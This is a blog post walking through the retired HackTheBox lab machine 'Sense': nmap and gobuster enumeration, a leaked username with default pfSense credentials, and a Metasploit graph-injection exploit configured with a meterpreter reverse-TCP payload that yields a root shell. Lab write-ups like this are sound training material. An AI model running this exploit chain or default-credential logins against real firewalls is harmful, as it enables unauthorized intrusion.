---
layout: post
title: "HackTheBox Sense Walkthrough"
date: 2018-03-24
tags: HackTheBox, Walkthrough
---

With Sense now being retired, I can go ahead and post my first "on time" hackthebox walkthrough.

#### Enumeration
Starting with Nmap, as always...
```
# Nmap 7.60 scan initiated Mon Mar 19 07:51:25 2018 as: nmap -p- -sC -sV -oA sense_full 10.10.10.60
Nmap scan report for 10.10.10.60
Host is up (0.049s latency).
Not shown: 65533 filtered ports
PORT    STATE SERVICE  VERSION
80/tcp  open  http     lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: Did not follow redirect to https://10.10.10.60/
443/tcp open  ssl/http lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: Login
| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US
| Not valid before: 2017-10-14T19:21:35
|_Not valid after:  2023-04-06T19:21:35
|_ssl-date: TLS randomness does not represent time

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Mar 19 07:53:26 2018 -- 1 IP address (1 host up) scanned in 121.24 seconds
```
So, we have a webserver. Navigating to it in Firefox we find that it is running PFSense:
![PFSense]({{"/img/blog_images/sense/pfsense.jpg" | absolute_url }})

A quick searchsploit revealed quite a few interesting vulnerabilities. However, all of the
apparently useful exploits require authentication.

```
searchsploit pfsense
---------------------------------------------------------------------------------------------- ----------------------------------
 Exploit Title                                                                                |  Path
                                                                                              | (/usr/share/exploitdb/)
---------------------------------------------------------------------------------------------- ----------------------------------
pfSense - 'interfaces.php?if' Cross-Site Scripting                                            | exploits/hardware/remote/35071.txt
pfSense - 'pkg.php?xml' Cross-Site Scripting                                                  | exploits/hardware/remote/35069.txt
pfSense - 'pkg_edit.php?id' Cross-Site Scripting                                              | exploits/hardware/remote/35068.txt
pfSense - 'status_graph.php?if' Cross-Site Scripting                                          | exploits/hardware/remote/35070.txt
pfSense - Authenticated Group Member Remote Command Execution (Metasploit)                    | exploits/unix/remote/43193.rb
pfSense 2 Beta 4 - 'graph.php' Multiple Cross-Site Scripting Vulnerabilities                  | exploits/php/remote/34985.txt
pfSense 2.0.1 - Cross-Site Scripting / Cross-Site Request Forgery / Remote Command Execution  | exploits/php/webapps/23901.txt
pfSense 2.1 build 20130911-1816 - Directory Traversal                                         | exploits/php/webapps/31263.txt
pfSense 2.2 - Multiple Vulnerabilities                                                        | exploits/php/webapps/36506.txt
pfSense 2.2.5 - Directory Traversal                                                           | exploits/php/webapps/39038.txt
pfSense 2.3.1_1 - Command Execution                                                           | exploits/php/webapps/43128.txt
pfSense 2.3.2 - Cross-Site Scripting / Cross-Site Request Forgery                             | exploits/php/webapps/41501.txt
pfSense Community Edition 2.2.6 - Multiple Vulnerabilities                                    | exploits/php/webapps/39709.txt
pfSense Firewall 2.2.5 - Config File Cross-Site Request Forgery                               | exploits/php/webapps/39306.html
pfSense Firewall 2.2.6 - Services Cross-Site Request Forgery                                  | exploits/php/webapps/39695.txt
pfSense UTM Platform 2.0.1 - Cross-Site Scripting                                             | exploits/freebsd/webapps/24439.txt
---------------------------------------------------------------------------------------------- ----------------------------------
```

PFsense's default credentials (admin:pfsense) didn't work. Attempting to brute force the login ended with my ip being blacklisted. Apparently that is not the way we're supposed to get in...

#### Web Content Discovery
Considering that we have a RCE Metasploit vulnerability and we got blacklisted trying to brute force the login, we probably need to find some credentials. After a lot gobuster scans, I finally found what I needed.
```
Gobuster v1.2                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.60/
[+] Threads      : 50
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Status codes : 301,302,307,403,200,204
[+] Extensions   : .txt
[+] Follow Redir : true
[+] Expanded     : true
=====================================================
http://10.10.10.60/changelog.txt (Status: 200)
http://10.10.10.60/tree (Status: 200)
http://10.10.10.60/installer (Status: 200)
http://10.10.10.60/system-users.txt (Status: 200)
http://10.10.10.60/%7echeckout%7e (Status: 403)
=====================================================
```
Changelog.txt told us that 2 of 3 vulnerabilities. It definitely sounds like we're on the right track with a pfsense vulnerability.

system-users.txt revealed a username (rohit) and a hint at the password: "password: company defaults."

Logging in with rohit:pfsense granted access to pfsense!

#### Exploitation
Now that we had usable credentials, we could go ahead and try out that MSF module.
```
Module options (exploit/unix/http/pfsense_graph_injection_exec):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD  pfsense          yes       Password to login with
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST     10.10.10.60      yes       The target address
   RPORT     443              yes       The target port (TCP)
   SSL       true             no        Negotiate SSL/TLS for outgoing connections
   USERNAME  rohit            yes       User to login with
   VHOST                      no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.X.X      yes       The listen address
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target
```
And we get dropped into Sense as root!
```
meterpreter > getuid
Server username: root (0)
```
#### Closing Thoughts
Overall, I'd consider Sense a *** box. I'm generally not a fan of VMs that require the use of a specific list to find critical information about the machine (in this case the username). However, because I was stuck at that stage for so long, I spent a lot of effort formalizing my web content discovery process, and in retrospect that was a great learning experience. It was quite frustrating at the time though... Also, while you needed to use the right list for content discovery, it was not an unusual list. I can't really complain about that too much.

It is nice that Sense was a realistic machine. Getting blacklisted is a great touch, and I'm generally more a fan of boxes that are realistic than CTF style.